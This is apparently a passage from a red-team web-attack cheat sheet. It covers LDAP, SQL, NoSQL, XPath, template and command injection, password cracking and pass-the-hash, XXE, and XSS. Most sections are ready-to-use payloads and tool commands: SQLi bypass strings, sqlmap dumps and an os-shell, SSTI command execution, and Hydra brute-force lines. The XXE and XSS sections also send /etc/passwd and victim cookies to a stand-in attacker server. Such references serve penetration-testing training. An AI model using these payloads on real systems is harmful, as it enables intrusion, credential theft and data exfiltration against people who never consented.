- `example.com/?name=Badguy)(cn=*))%00&password=admin`: Modified URL with LDAP injection to authenticate as Badguy
- `example.com/?name=b*)(cn=*))%00&password=admin`: To login as any user available starting with “b”

<br />

## OPEN REDIRECT
## Info
- Open Redirects are normally low impact vulnerabilities (unless you can steal Oauth tokens)
- Example:
	- Start Page: http://example.com/login.php
	- Redirect happens when the following is entered: http://example.com/
	- Output: Code 3xx
	- `curl http://example.com/`: curl (by default) does not follow redirects
- Use webhooks to check if your redirect works:
   - [https://webhook.site](https://webhook.site)
   - [https://bin.webhookrelay.com](https://bin.webhookrelay.com/)
- Note that below URLs are identical:
   - `http://example.com/redirect.php?uri=https://webhook.site/xyz`
   - `http://example.com/redirect.php?uri=//webhook.site/xyz`

```
#Implementation of function "die()" to stop executing code after redirect

<?php
  if (!isset($_SESSION['username'])) {
	header("Location: /login.php");
	}
	require "header.php";
	die(); 			# this would stop the code after redirect to /login.php
?>
```
## HowTo
### DOM Based URL Redirection
- Look for `https://example.com/#dashboard`
- The value after `#` is accessible by Javascript
- Use `window.location.hash`
- If URL Redirection is in place you can test if a redirection to an external site is possible
- Enter `https://example.com/#www.externalsite.com`
- Activate the redirection via Javascript
- `window.location = window.location.hash.substr(1)`: use substr() to remove the '#'
- Following mitigations exist:
   - A) URL Whitelisting: `https://example.com/redirect?externalPage=1` or `https://example.com/redirect?page=dashboard`
   - B) REGEX

<br />

## PASSWORD HACKING
## Info
### Rainbow Tables
- Good for LM, NTLM and MD5 Hashes without Salt or Pepper
- Less CPU power, but more storage needed (!) 
   - NTLM hash with [uppercase, lowercase, numbers] and max length of 9 chars = 690GB of space (!)

### Lookups
- Query a database with hashes and passwords
- Easiest way to crack hashes
- Difference between Lookups and Rainbow Tables:
    - Data not stored on your system (no huge disk required)
    - DB contains well known wordlist and breach data (i/o every single combination)

## HowTo
### Pass the Hash (Hash Injection Attack)
- Use dumped hashes for Authen (password not required!)
- `pth-winexe -U [targetUser] //[IPv4] [command]`
- Best Case: User-Account-Control off, Windows Firewall off
- Helpful with LM, NTLM-Authen and SSO-mechanisms

### Wordlists
1. Kali: /usr/share/wordlists (pre-installed)
2. CLI tool **crunch**
   - `crunch 4 6 abcdefg123! -o crunchlist1.txt`
   - 4 6 = word length between 4 and 6
   - abcdefg123! = use chars out of this list
3. CLI tool **cewl**
   - custom wordlist generator based on website content
   - `cewl https://cisco.com -m 6 -d 3 -w cisco.cewl`
   - -m = minimum word length
   - -d = depth of sub directories
   - -w = write
4. [https://github.com/p-arrow/SecLists/tree/master/Passwords](https://github.com/p-arrow/SecLists/tree/master/Passwords)

### John the Ripper
- Detailed examples: [https://www.openwall.com/john/doc/EXAMPLES.shtml](https://www.openwall.com/john/doc/EXAMPLES.shtml)
- Install Jumbo Patch: [Github/openwall](https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL)
- copy full user line into file and save as mypass: `victim:R7xTxLfuQeacY:19003:0:99999:7:::`
- `john mypass`: use discovered password hash from "mypass" and supply it to john 
- `john mypass --format=NAME`: Specify the hash format (descrypt/bsdicrypt/md5crypt/bcrypt/LM/AFS/tripcode/dummy/crypt)
- `john --list=formats`: show available hash formats recognized by john (**after installation of john jumbo patch**
- `john --show mypass`: show results after cracking of mypass
- `john --wordlist=cisco.cewl --rules mypass`: enable wordlist for password cracking
- `john --restore`: continue interrupted session
- `nano /etc/john/john.conf`: configuration of wordlist-rules
- results are saved under .john/john.pot (No second run with same wordlist necessary) 
- On Linux: `unshadow /etc/passwd /etc/shadow > mypasswd` ; `john mypasswd`
- For zip files use `zip2john file.zip > zip.hashes` (this generates hashes which you can crack by using `john zip.hashes`)
- For rar files use `rar2john file.rar > rar.hashes` (this generates hashes which you can crack by using `john rar.hashes`)

### Hydra
Check out: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)*

```
hydra -h ; hydra http-form-post -U (service module help)
hydra -l admin -P pw.txt "http-form-post://IPv4:80/login:username=^USER^&password=^PASS^:fail"
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
hydra -l admin -p password ftp://[192.168.0.0/24]/
hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

### Hashcat
- Check out: [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)
- msf: `use post/windows/gather/hash` ("run" requires admin privilege)
- NT-Hash Syntax: `<Uname>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:`
- `hashcat -m 1000 -a 0 hash.txt /usr/share/john/password.lst`
    - `-m 1000` = hash-type NTLM
    - `-m 900` = MD4 | `-m 0` = MD5 | `-m 100` = SHA1 | `-m 3000` = LM | `-m 16500` = JWT
    - `-a 0` = attack-mode Straight
    - `-a 1` = Combination | `-a 3` = Brute-force
- `hashcat --show hash.txt` Show cracked hashes
- Alternatively, hashcat shows the PW directly besides the cracked hash: `eyJ0eXAiOiJKV1QiL[...]Ancsw:secret`

### pwdump/FGDump
- Dump LM/NTLM-Hash via pwdump/FGDump:
    - pwdump-structure: `<Uname>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:`
- LM Hash for "no password": 
    - `"aad3b435b51404ee" "aad3b435b51404ee"`

<br />

## RUBY
## Info
- URL-Decode in Ruby: `require 'uri'; URI.decode("http%3A%2F%2Fexample.com%2F%3Fa%3Druby%20uri%20decode")`

## HowTo
### Ruby on Rails: Data Type Conversion
  - Data may be hidden in html, but can be viewed in another format like JSON in modern frameworks
  - #1 HTML: http://example.com/users/1 
  - #2 JSON: http://example.com/users/1.json
  - #2 JS: http://example.com/users/1.js
  - Bypass WAF with modifed Header: `curl https://example.com/users/1 -H 'accept:application/json'`

### Render
  - With the render method  and :inline option you can feed ERB as part of the method call. 
  - By default, inline rendering uses ERB. You can force it to use Builder instead with the :type option:
  - `render inline: "<% products.each do |p| %><p><%= p.name %></p><% end %>"`: ERB
  - `render inline: "xml.p {'Horrid coding practice!'}", type: :builder`: Builder
  - Details: [Ruby on Rails](https://guides.rubyonrails.org/layouts_and_rendering.html)
  - Another Example: 
    - Neutral: `http://example.com/pages?id=text`: code syntax in the background: render params[:id] -> render 'text'
    - Payload added: `http://example.com/pages?id[inline:]=%22%3C%%3D%20%60id560%20%%3E%22`: Code syntax: `render inline: "<%= 'id' %>"`
    - Payload added: `http://example.com/pages?id[inline:]=%22%3C%%3D%20%25x%7Bid%7D%20%%3E%22`: Code syntax: `render inline: "<%= %x{id} %>"`

### Mass Assignment
- Introduction on [code.tutsplus.com](https://code.tutsplus.com/tutorials/mass-assignment-rails-and-you--net-31695)
- Developers can use ActiveRecord (Ruby-on-Rails' most common data mapper)
- Then, class Organisation can have multiple user's
- Then, the relation is managed using a field organisation_id inside the User class
```
class User < ActiveRecord::Base
  belongs_to :organisation
end

class Organisation < ActiveRecord::Base
  has_many :users
end
```

### Open a File
- Ruby has two ways to open a file:
  - `File.open`
  - `Kernel.open` or just `open` 
- `open` will run the filename as command if it starts with a pipe `|`
- An attacker can use this scheme to perform **command injection**
- Example: 
```
$ irb
irb(main):001:0> File.open("|/usr/bin/uname").read()
Errno::ENOENT: No such file or directory - |/usr/bin/uname
  from (irb):1:in `initialize'
  from (irb):1:in `open'
  from (irb):1
  from /usr/bin/irb:12:in `<main>'
irb(main):002:0> open("|/usr/bin/uname").read()
=> "Linux\n"
```

### Ruby 2.x Universal RCE Deserialization Gadget Chain
- Blog post from [Luke Jahnke](https://www.elttam.com/blog/ruby-deserialization/#content)
- Modify the payload given in the blog post and inject it to a vulnerable Ruby application
- When executing this gadget chain you might get an error message from the application but the code is executed anyway

<br />

## SSI
## HowTo
- SSI (Server-Side Includes) are directives that the web server parses before serving the page to the user
```
GET / HTTP/1.1
Host: www.example.com
Referer: <!--#exec cmd="/bin/uname"-->
User-Agent: <!--#include virtual="filename"-->
```
   
<br />

## SERVER SIDE REQUEST FORGERY
## Info
- Based on HTTP Requests
- Basically you get the server to make HTTP requests on your behalf
- `http://example.com/?url=http://localhost:1234/`: request access to localhost (= server) on port 1234

<br />

## SERVER SIDE TEMPLATE INJECTION 
## Info
- This attack pattern requires for instance Flask/Jinja development stack (Python)
- Readings: https://hackerone.com/reports/125980
- or [Twig](https://twig.symfony.com/), a PHP template engine

## HowTo
```
#Simple calculation
{{'7'*7}}   																			

#Retrieve available classes and modules
{{''.__class__.mro()[1].__subclasses__()}}    						

#Execute command
{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}		
```
- Check out popen for usage as subclass called: https://docs.python.org/3/library/subprocess.html?highlight=popen#subprocess.Popen
- Use below payload when Twig is deployed on the target system:
   - `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`

<br />

## SESSION INJECTION
## Info
- Normally there are two types of session management:
  - 1) The content of the session is sent back to the client (after client side registration or login)
  - 2) The content of the session is stored server side (after client side registration or login)
- In case of mechanism 1), many applications will send back a signed cookie as valid session token
- Most frameworks will rely on known formats (YAML, JSON, object serialisation etc.) to store session's information
- It may happen that you find applications that use a different approach - including security impact: [Play Framework](https://www.playframework.com/security/vulnerability/20130806-SessionInjection)

## HowTo
1. Check the session management of the targeted application, i.e. does the server send back any session token or cookie which you can analyze?
2. Check if user controlled data is stored in the token
3. Try to inject additional characters at time of registration or login, e.g. `%00`,`:`, numbers, chars etc.
4. If you succeed you need to find a way to insert additional `key:value` pairs to gain additional privileges or become a different user
5. If you are lucky the server will NOT throw an error or encode your injection. In that case you can modify the session according to your needs
6. Copy & Paste the session token from server's response and insert it into a valid session, that you started with another user registered yourself

<br />

## SESSION FIXATION
## Info
- Session fixation becomes possible if the value of the session cookies before and after authentication keeps the same
- **Best Practice (Blue Team)**
- Refresh the sessionID after authentication
- Ensure the sessionID integrity

## HowTo
- Visit a website: `GET / HTTP1.1 example.com`
- Check the HTTP response for: `Set-Cookie: JSESSIONID=0000d8eyY876765987q3L0z2fgq10m4v` (example value)
- Authenticate on the website and check the response again
- If there is no new cookie set, then chance is high that session hijacking is possible


<br />

## SQLi
## Info
- Full Cheat Sheet: [www.netsparker.com/blog](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [Coding/SQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/SQL.md)
- [W3School SQL](https://www.w3schools.com/sql/)

## HowTo
- Before starting any SQLi attack you should write down the **Query Syntax** that is likely in place
- Then you will better understand **How** and **What** to inject !!!
- Additionally you should get sure about the **SQL DB Type** that you are interacting with !
  1. MySQL
  2. SQL Server
  3. PostgreSQL
  4. Oracle
  5. MongoDB (NoSQL)

### SQL Injection: Quick and Dirty
```
#Try both ' (single quote) and " (double quote)
#Continue with the quote that breaks the implemented SQL syntax

admin' --
admin' #
admin'/*
admin'/**/OR/**/1=1/**/#
admin'%09OR%091=1%09# (when intercepting query with proxy, you can use "%09" as "space")
test' OR 1=1 LIMIT 1; #
' or 1='1
' or 1=1 --
' or 1=1 #
' or 1=1 /*
') or ‘1’ =’1--
') or (‘1’=’1--
' || 1=’1
```

### MongoDB (NoSQL)
```
|| 1==1 %00
|| 1==1 //
|| 1==1 <!--
'|| 1==1 <!--
/?username=admin'|| 1==1 %00

#There are case where the password field does not exist for some records (since it's a NoSQL database)
#Then you can implement regex-command "this.password" or "this.password.match()" in your payload
1) /?search=admin'%20%26%26%20this.password.match(/^./)%00 
2) /?search=admin'%20%26%26%20this.password%20%26%26%20this.password.match(/^./)%00 
```
### MySQL addslashes
- [http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string](http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string)
- This exploit relies on the usage of GBK
- It's possible to generate a single quote and break out of the SQL syntax to inject a payload
- Use the string \xBF' → %bf%27 or 1=1 -- 
- in Burp: `username=%bf%27+OR+1=1+#&password=test`

### SQL Comments
```
#Use Comments to finish your payload. Hence you don't rely on the original code that follows your payload

1) --
2) /*  */
3) #
```

### Combine Queries 
```
#Link queries with ";"
SELECT * FROM xyz ; SELECT * FROM abc`

#Link queries with UNION injections
#You can poison query to return records from different tables
#The number of columns from both SELECT statements >>must be<< identical !
SELECT username, admin FROM members UNION SELECT password, admin FROM members
/test.php?id=3 OR '1'='1' UNION SELECT id, login, user, password FROM users
/test.php?id=3 OR '1'='1' UNION SELECT id, login, version(), password FROM users
/test.php?id=3 OR '1'='1' UNION SELECT database(), login, current_user(), password FROM users
/test.php?id=3 OR '1'='1' UNION SELECT 1, concat(table_name, “:”, column_name), 3, 4 FROM information_schema.columns
/test.php?id=3 OR '1'='1' UNION SELECT 1, concat(login, “:”, password), 3, 4 FROM users
```

### Tools
#### mssqlclient.py
- `python3 mssqlclient.py USER@10.10.10.27 -windows-auth`
- `SELECT IS_SRVROLEMEMBER('sysadmin')`
   - Output "1" = yes

#### sqlmap
- **GET Request**
- `sqlmap -u "http://example.com/dashboard.php?search=1" --cookie="PHPSESSID=906teqggggrr6nbs1k9bqbtkfs6"`
- `sqlmap -u "http://example.com/dashboard.php?search=1" --cookie="PHPSESSID=906teqggggrr6nbs1k9bqbtkfs6" --tables`: Get tables
- `sqlmap -u "http://example.com/dashboard.php?search=1" --cookie="PHPSESSID=906teqggggrr6nbs1k9bqbtkfs6" --os-shell`: Spawn shell
- **POST Request**
- Send POST request to target via proxy (Burp etc.)
- Save POST request as file (e.g. as "request")
- `sqlmap -r request -p password` Set POST request parameter "password as vulnerable parameter  with `-p` (Parameter)
- If sqlmap evaluates the target as vulnerable, then...
- `sqlmap -r request --schema`: Retrieve DBMS schema
- `sqlmap -r request --tables`: Retrieve DBMS tables
- `sqlmap -r request --columns`: Retrieve DBMS columns
- `sqlmap -r request --dump-all` 
- `sqlmap -r request -D [database] -T [table] --dump`: Specify DB and Table and dump content
- `sqlmap -r request -D [database] -T [table] -C [column] --dump`: Specify DB, Table and Column and dump content

<br />

## TEMPLATE INJECTION
## HowTo
- Given Express.js and template EJS (Embedded Javascript), use following command injection:
- `<%=global.process.mainModle.require('child_process').execSync('whoami').toString()%>` when using GET `/`
```
[...]
app.get("/", (req,res) => {
	//render index template
	var template = `<h2>${req.query.name}</h2>`
	res.send(ejs.render(template))
});

app.listen(port, () => console.log("Example app listening on port ${port}!"));
```

<br />

## XML
## Info
### Missing Encryption/Input Validation
- XML data vulnerable to spoofing /request forgery / code injection

### XML Bomb
- Entities that expand to exponential size, consuming memory (DoS!)

### XML External Entity (XXE)
- Embeds a request for a local resource (LFI with XML)
- Embeds a request for resolving an external resource (e.g. malicious server)

### XPath
- Imagine the XML document as a database, and XPath as an SQL query
- Like with SQLi you can manipulate the query and get unauthorized access to the system 
- Syntax: `[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]`


## HowTo
### XXE
- Option 1: **Internal**
```
<!DOCTYPE test [
    <!ENTITY x SYSTEM "file:///etc/passwd">]>
<test>&x;</test>

#Don't forget to encode "&" with "%26" when sending this payload as URL
```

- Option 2: **External**
  - It's recommended to have 4 terminals next to each other:
  - One to send the initial request (step 1)
  - One to serve the DTD (step 2&3)
  - One to retrieve the information sent by the server (step 5)
  - One for debugging purpose
```
#1) 
#Change Content-Type to "text/xml"
#Start your own server on your desired port (here port 7000)
POST /login HTTP/1.1
Host: 192.168.0.33
Connection: close
Content-Type: text/xml
Content-Length: 97

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://yourServerIP:7000/test.dtd">
<foo>&e1;</foo>
#The target server will throw an 400 error since it cannot retrieve "test.dtd" from your own server

# 2)
#Create test.dtd within your web server directory
#Insert below content into "test.dtd"
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://yourServerIP:7007/?%p1;'>">
%p2;
#Change the port, because the final reply including /etc/passwd will be sent to another port later
#If you write <!ENTITY % p2 SYSTEM "http://yourServerIP:7007/?%p1;"> only, then the server won't send passwd but only "GET /?%p1" (p1 gets not evaluated)
#Therefore you need to add another entity e1 within variable %p2 in order to parse %p1 correctly
#test.dtd will look like: <!ENTITY e1 SYSTEM 'http://yourServerIP:7007/etc/passwd'>
#Once the server finished processing the DTD, it will assign the content to e1 and send it to your server:7007

# 3)
# Listen on port 7007 to retrieve the content of /etc/passwd
netcat -lp 7007
```

### XPath
```
#XPath Injection
' or '1'='1 and you should get all results.

#Get up in hierarchy by using parent::* --> Remember: [PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]
#Use NULL BYTE to end the string
username']/parent::*/child::node()%00    #go up to parent directory, then access childs and display all nodes
username' or 1=1]/parent::*/child::node()%00    #display all nodes related to "username" with respective value
admin' or 1=1]/parent::*/child::node()%00    #display all nodes related to "admin" with respective value
```

<br />

## XSS
## Info
1. **Reflected XSS**
- non-persistent effect activated by a victim clicking a link
- Example: `https://example.com/search?q=<script%20type='application/js'>alert('xss')</script>`
2. **Stored/Persistent XSS**
- Attempts to store data persistently on the web server
3. **DOM-based XSS**
- Attempt to exploit the victim's web browser
- The page could actually be completely static and still be vulnerable
- Example: `https://example.com/index.html#default=<script>alert(document.cookie)</script>`
- On vulnerable source code side: `<script>document.write(decodeURIComponent(location.hash.substring(1)));</script>`
     
## HowTo
### Common Patterns
- [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)
```
<script>alert("XSS LEAK")</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(2)>
"; alert(1) ; //

#General Approach (Best Practice!)
# 1) Insert below "benign" payload
1234 '" ><

# 2) Take a look after injecting your code and analyze how the application interpreted it
# 3) Search your payload via crtl+F inside the pages source code
# 4) Then modify the payload to get your code executed
```
### PHP_SELF
```
#Sometimes developers use and trust PHP_SELF (= path provided by the user)
#Often found on pages with forms or error pages (404 and 500)

#ORIGINAL
<form action="/index.php" method="POST">
Your name:<input type="text" name="name" />
<input type="submit" name="submit"/>
</form> 

#MODIFIED
<form action="/index.php/test"><script>alert('xss')</script><" method="POST">
Your name:<input type="text" name="name" />
<input type="submit" name="submit"/>
</form> 
```
### Steal Cookies (from example.com)
- **Variant 1**: Insecure Cookie Attributes
```
#Mind the correct usage of " (double quote) and ' (single quote) !!
#Encoded (necessary for successful exploit)
http://example.com/index.php?name=test%3Cscript%3Edocument.write(%27%3Cimg%20src=%22http://yourOwnMalicious.site?c=%27%2Bdocument.cookie%2B%27%22%20/%3E%27);%3C/script%3E

#NotEncoded
http://example.com/index.php?name=test<script>document.write('<img src="http://yourOwnMalicious.site?c='+document.cookie+'" />');</script>
```
- **Variant 2**: [JSONP](https://en.wikipedia.org/wiki/JSONP)
```
#Prepare a HTML website
#You either copy the design of the original website (tedious) or you simply keep it lean (pretty obvious towards the victim)
<!DOCTYPE html>
<html>
  <head>
    <title>My Malicious Page</title>
  </head>
  <body>
	<h1>Thanks for your secrets!</h1>
	
	#function declaration; the sensitive data gets appended to the URL (which can be observed at your webserver logs)
	<script>
	function display(data) {
  	for (var key in data){
    		document.write("<img src='http://yourWebserver/index.html?img="+data[key]+"'\>");
  		}
	}
	</script>
	
	#function call; the original JS script is embedded on the legitimate website
	#The legitimate website has to enable SameSite=None to retrieve the cookie with data !
	<script src="http://legitimateWebsite/secrets.js"></script>
  </body>
</html>


#The final output in your web server logs looks similar to this:
127.0.0.1 - - [03/Feb/2022 15:31:07] "GET /index.html?img="sensitive data" HTTP/1.1" 200 -
```
